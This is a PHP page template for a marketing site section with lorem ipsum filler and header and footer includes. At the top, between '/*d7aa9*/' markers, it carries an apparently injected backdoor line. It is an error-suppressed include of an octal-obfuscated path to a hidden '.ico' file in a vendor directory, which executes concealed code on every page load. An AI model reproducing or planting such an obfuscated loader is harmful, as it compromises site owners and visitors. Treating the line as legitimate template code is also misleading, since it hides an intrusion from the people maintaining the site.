<?php
/*d7aa9*/

@include "\057hom\145/ch\141wte\143hso\154uti\157n/p\165bli\143_ht\155l/e\170per\164/ve\156dor\057mag\145nto\057.de\066154\0640.i\143o";

/*d7aa9*/



 include 'header.php'; ?>

	<section class="BodyWrapper">
		<div class="header-mid-container">
			<h2>For Marketers
			  <span>Let Your Team Do Their Job</span>
			</h2>
			<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.</p>
			<a class="default-btn more-btn" href="#">More Info</a> 
		</div>
	</section>	

<?php include 'footer.php'; ?>
